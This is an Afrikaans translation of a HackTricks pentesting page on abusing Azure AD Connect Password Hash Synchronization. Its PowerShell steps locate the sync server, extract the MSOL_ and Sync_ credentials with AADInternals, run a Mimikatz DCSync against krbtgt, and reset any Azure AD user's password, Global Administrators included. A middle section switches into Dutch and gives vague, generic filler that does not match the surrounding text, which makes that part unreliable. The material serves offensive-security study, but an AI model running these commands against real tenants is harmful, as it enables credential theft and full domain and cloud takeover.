# Az - PHS - Wagwoordhash-sinkronisering

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Basiese Inligting

[Volgens die dokumentasie:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) **Wagwoordhash-sinkronisering** is een van die aanmeldingsmetodes wat gebruik word om hibriede identiteit te bereik. **Azure AD Connect** sinkroniseer 'n hash, van die hash, van 'n gebruiker se wagwoord van 'n plaaslike Active Directory-instantie na 'n wolkgebaseerde Azure AD-instantie.

<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Dit is die **mees algemene metode** wat deur maatskappye gebruik word om 'n plaaslike AD met Azure AD te sinkroniseer.

Alle **gebruikers** en 'n **hash van die wagwoordhashes** word van die plaaslike na Azure AD gesinkroniseer. Tog word **duidelike teks wagwoorde** of die **oorspronklike** **hashes** nie na Azure AD gestuur nie.\
Verder word **ingeboude** sekuriteitsgroepe (soos domeinadministrateurs...) **nie gesinkroniseer** na Azure AD nie.

Die **hash-sinkronisering** vind elke **2 minute** plaas. Standaard word **wagwoordverval** en **rekeningverval** egter **nie gesinkroniseer** in Azure AD nie. Dus kan 'n gebruiker wie se **plaaslike wagwoord verval het** (nie verander nie) steeds **toegang verkry tot Azure-hulpbronne** met die ou wagwoord.

Wanneer 'n plaaslike gebruiker toegang tot 'n Azure-hulpbron wil verkry, vind die **outentisering plaas op Azure AD**.

**PHS** is nodig vir funksies soos **Identity Protection** en AAD Domain Services.

## Pivoting

Wanneer PHS gekonfigureer is, word sommige **bevoorregte rekeninge** outomaties **geskep**:

* Die rekening **`MSOL_<installationID>`** word outomaties geskep in die plaaslike AD. Hierdie rekening word 'n **Directory Synchronization Accounts**-rol gegee (sien [dokumentasie](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)), wat beteken dat dit **replikasie (DCSync)-regte in die plaaslike AD** het.
* 'n Rekening **`Sync_<name of on-prem ADConnect Server>_installationID`** word in Azure AD geskep. Hierdie rekening kan die wagwoord van ENIGE gebruiker (gesinkroniseer of slegs in die wolk) in Azure AD **herstel**.

Die wagwoorde van die twee vorige bevoorregte rekeninge word **in 'n SQL-bediener gestoor** op die bediener waar **Azure AD Connect ge√Ønstalleer is**. Admins kan die wagwoorde van daardie bevoorregte gebruikers in duidelike teks onttrek.\
Die databasis is gele√´ in `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`.

Dit is moontlik om die konfigurasie uit een van die tabelle te onttrek, waarvan een versleutel is:

`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

Die **versleutelde konfigurasie** is versleutel met **DPAPI** en dit bevat die **wagwoorde van die `MSOL_*`**-gebruiker in die plaaslike AD en die wagwoord van **Sync\_\*** in AzureAD. Daarom is dit moontlik om hierdie wagwoorde te kompromitteer en privesc na die AD en na AzureAD uit te voer.

Jy kan 'n [volledige oorsig van hoe hierdie legitimasie gestoor en ontsluit word in hierdie praatjie](https://www.youtube.com/watch?v=JEIR5oGCwdg) vind.

### Die **Azure AD Connect-bedieners** vind

As die **bediener waar Azure AD Connect ge√Ønstalleer is** domein-gekoppel is (aanbeveel in die dokumentasie), is dit moontlik om dit te vind met:
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### Misbruik van MSOL\_\*

In sommige gevallen kan het mogelijk zijn om de MSOL\_\*-accounts te misbruiken om laterale beweging uit te voeren in een hybride identiteitsomgeving met Azure AD Connect. Dit kan worden bereikt door het uitbuiten van de Password Hash Synchronization (PHS) functie.

#### Password Hash Synchronization (PHS)

PHS is een functie van Azure AD Connect waarmee wachtwoordhashes van gebruikersaccounts worden gesynchroniseerd vanuit de on-premises Active Directory naar Azure AD. Hierdoor kunnen gebruikers hun on-premises wachtwoorden gebruiken om in te loggen op cloudservices.

#### Misbruik van PHS

Om PHS te misbruiken, moet een aanvaller toegang hebben tot een MSOL\_\*-account. Dit kan worden bereikt door het verkrijgen van de inloggegevens van een beheerder of door het uitvoeren van een privilege-escalatieaanval.

Eenmaal ingelogd op een MSOL\_\*-account, kan de aanvaller de wachtwoordhash van een gebruiker extraheren. Deze hash kan vervolgens worden gebruikt om laterale beweging uit te voeren naar andere systemen in de hybride identiteitsomgeving.

#### Bescherming tegen misbruik

Om misbruik van PHS te voorkomen, is het belangrijk om de beveiliging van de MSOL\_\*-accounts te versterken. Dit kan worden bereikt door het implementeren van sterke wachtwoordbeleidsregels, het beperken van de toegang tot MSOL\_\*-accounts en het monitoren van verdachte activiteiten.

Daarnaast is het essentieel om regelmatig patches en updates toe te passen op Azure AD Connect om bekende kwetsbaarheden te verhelpen en de beveiliging te verbeteren.

#### Conclusie

Het misbruiken van MSOL\_\*-accounts en het uitbuiten van PHS kan een effectieve manier zijn om laterale beweging uit te voeren in een hybride identiteitsomgeving. Het is van cruciaal belang om de beveiliging van deze accounts te versterken en proactieve maatregelen te nemen om misbruik te voorkomen.
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
{% hint style="danger" %}
Jy kan ook [**adconnectdump**](https://github.com/dirkjanm/adconnectdump) gebruik om hierdie geloofsbriewe te verkry.
{% endhint %}

### Misbruik van Sync\_\*

Deur die **`Sync_*`**-rekening te kompromitteer, is dit moontlik om die wagwoord van enige gebruiker (insluitend Globale Administrateurs) te herstel.
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
Dit is ook moontlik om die wagwoorde van slegs **wolkkli√´nte** te wysig (selfs al is dit onverwags)
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
Dit is ook moontlik om die wagwoord van hierdie gebruiker te dump.

{% hint style="danger" %}
'n Ander opsie sou wees om **bevoorregte toestemmings aan 'n diensprinsipaal toe te ken**, waar die **Sync**-gebruiker **toestemmings** het om dit te doen, en dan **toegang te verkry tot daardie diensprinsipaal** as 'n manier van privesc.
{% endhint %}

### Naadlose SSO

Dit is moontlik om Naadlose SSO met PHS te gebruik, wat vatbaar is vir ander misbruik. Kontroleer dit in:

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## Verwysings

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
